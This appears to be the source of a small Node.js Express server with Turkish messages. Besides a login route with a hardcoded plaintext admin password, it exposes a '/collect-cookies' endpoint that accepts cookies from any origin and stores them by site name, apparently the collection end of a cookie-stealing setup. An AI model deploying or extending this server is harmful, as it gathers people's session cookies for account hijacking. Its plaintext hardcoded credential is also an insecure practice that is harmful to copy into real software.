const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');
const sqlite3 = require('sqlite3').verbose();
const cors = require('cors');

const app = express();
const port = 3000;

app.use(cors());
app.use(bodyParser.json());

const db = new sqlite3.Database(':memory:');

db.serialize(() => {
    db.run("CREATE TABLE users (username TEXT, password TEXT)");
    db.run("CREATE TABLE cookies (siteName TEXT, name TEXT, value TEXT)");

    const stmt = db.prepare("INSERT INTO users VALUES (?, ?)");
    stmt.run("admin", "deneme123");
    stmt.finalize();
});

app.post('/login', (req, res) => {
    const { username, password } = req.body;
    db.get("SELECT * FROM users WHERE username = ? AND password = ?", [username, password], (err, row) => {
        if (err) {
            return res.status(500).json({ success: false, message: 'Veritabanı hatası' });
        }
        if (row) {
            res.json({ success: true });
        } else {
            res.json({ success: false, message: 'Geçersiz kullanıcı adı veya şifre' });
        }
    });
});

app.post('/collect-cookies', (req, res) => {
    const { cookies, siteName } = req.body;
    if (!cookies) {
        return res.status(400).json({ message: 'Cookie verisi bulunamadı!' });
    }

    const site = siteName || "Bilinmiyor"; 

    const stmt = db.prepare("INSERT INTO cookies VALUES (?, ?, ?)");
    cookies.forEach(cookie => {
        stmt.run(site, cookie.name, cookie.value);
    });
    stmt.finalize();

    res.json({ success: true, cookies });
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.listen(port, () => {
    console.log(`Sunucu http://localhost:${port} adresinde çalışıyor`);
});
